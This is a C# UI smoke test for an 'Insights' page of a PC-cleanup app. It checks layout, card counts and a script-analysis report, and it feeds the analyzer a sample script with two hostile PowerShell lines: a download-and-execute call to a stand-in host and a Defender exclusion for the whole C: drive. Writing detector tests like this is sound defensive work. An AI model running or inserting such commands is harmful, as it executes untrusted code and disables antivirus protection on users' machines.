using System.Windows;
using System.Windows.Controls;
using PcTidy.Core;
using PcTidy.Core.Model;
using PcTidy.Features.Insights.Scripts;
using PcTidy.Features.Insights.Source;
using PcTidy.Features.Insights.View;
using PcTidy.Hosting;
using Xunit;

namespace PcTidy.Features.Insights.Tests;

/// <summary>The page loads with the app's resources and lays out at 1000 px with every card and a script report.</summary>
public class UiSmokeTests
{
    [Fact]
    public void Insights_page_shows_cards_and_a_script_report_at_1000px()
    {
        using var tb = new TestbedFolder();
        using var host = PcTidyHost.CreateSandbox(tb.Root, SandboxProfile.Default);
        var src = new FakeSource
        {
            Displays = { new DisplayFacts("Monitor", 60, 144, 2560, 1440) },
            Memory = ReadOutcome<MemoryFacts>.Ok(new MemoryFacts(new[] { new MemoryModule("DIMM1", 16L << 30, 3200, 3200) }, 2)),
        };
        TestbedFolder.BigOldFile(Path.Combine(host.Locations.CloudRoots[0], "old.mov"), 80L << 20, FixedClock.Now.AddYears(-1));
        UiThread.Run(() =>
        {
            {
                var module = new InsightsModule(_ => src, new FixedClock());
                var page = Assert.IsType<InsightsView>(module.CreatePage(host));
                var scanner = (InsightsScanner)module.Scanners[0];
                var report = scanner.ScanReportAsync(host.CreateScanContext(ScanDepth.Quick), null, CancellationToken.None).GetAwaiter().GetResult();
                page.ShowReport(report);
                page.ShowScriptReport(ScriptAnalyzer.Analyze("boost.ps1", "irm https://x.example.invalid/a.ps1 | iex\nAdd-MpPreference -ExclusionPath C:\\"));
                page.Measure(new Size(1000, 800));
                page.Arrange(new Rect(0, 0, 1000, 800));
                page.UpdateLayout();
                Assert.True(page.DesiredSize.Width <= 1000);
                var sections = (StackPanel)page.FindName("Sections");
                Assert.Equal(Visibility.Visible, sections.Visibility);
                // All 23 cards but the script hero: those that apply as cards, "Not available" ones in one compact list per category (UI3-16).
                var cards = report.Cards.Where(c => c.Id != InsightsIds.ScriptScan).ToList();
                Assert.Equal(23, cards.Count);
                Assert.Equal(cards.Count(c => c.IsAvailable), sections.Children.OfType<PcTidy.UI.Controls.ResponsiveGrid>().Sum(g => g.Children.Count));
                var unavailableNames = sections.Children.OfType<Border>()
                    .SelectMany(b => ((StackPanel)b.Child).Children.OfType<TextBlock>()).Select(System.Windows.Automation.AutomationProperties.GetName)
                    .Count(n => n.Contains("not available on this PC"));
                Assert.Equal(cards.Count(c => !c.IsAvailable), unavailableNames);
                var findings = (ListBox)page.FindName("FindingsList");
                Assert.Equal(2, ((System.Collections.ICollection)findings.ItemsSource).Count);
                // Measured numbers show with their hardware and source (refresh-rate card: 60 of 144 Hz).
                Assert.Contains(report.Find(InsightsIds.RefreshRate)!.Measured, m => m.Source == "PCWorld");
            }
        });
    }
}
